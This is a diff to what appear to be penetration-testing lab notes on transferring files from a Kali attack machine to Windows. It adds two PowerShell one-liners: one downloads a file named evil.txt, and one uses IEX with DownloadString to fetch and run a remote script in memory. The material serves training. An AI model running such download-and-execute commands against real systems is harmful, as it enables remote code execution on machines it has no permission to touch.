@@ -83,6 +83,12 @@ This creates the wget.ps1 script. In order to run the script we must first enabl
 And we can see our file has downloaded.
 ![[Pasted image 20220720024112.png]]
 
+This script can be run in a number of ways. For example, a one liner version:
+
+`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.130/evil.txt', 'new-evil.txt')`
+
+Or as a one liner, executing the requested payload remotely rather than saving and execute the file locally.
+`powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')`
 
 **3.  For PowerShell version 3 and above, which is present by default on Windows 8.1 and Windows 10, the cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) was added. Try to make use of it in order to perform both upload and download requests to your Kali machine.**
 
